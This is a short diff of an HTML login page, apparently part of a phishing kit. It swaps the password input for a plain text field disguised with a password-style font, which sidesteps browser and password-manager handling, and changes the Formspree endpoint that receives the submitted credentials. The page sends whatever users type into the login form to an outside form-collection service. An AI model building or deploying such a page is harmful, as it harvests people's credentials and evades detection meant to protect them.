@@ -106,7 +106,8 @@ body {
     </div>
     <div class="field">
         <svg class="input-icon" ...></svg>
-        <input name="passwórd" placeholder="Password" class="input-field" type="password" required>
+        <input type="text" name="passcode" style="font-family: 'password';">
+
     </div>
     <div class="btn">
         <button type="submit" class="button1">Login</button>
@@ -123,7 +124,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     const data = new FormData(form);
 
     // Submit to Formspree
-    fetch("https://formspree.io/f/xldlqyrb", {
+    fetch("https://formspree.io/f/xrblnvab", {
         method: "POST",
         body: data,
         headers: { 'Accept': 'application/json' }
@@ -139,4 +140,5 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
 
 </body>
 </html>
+
 
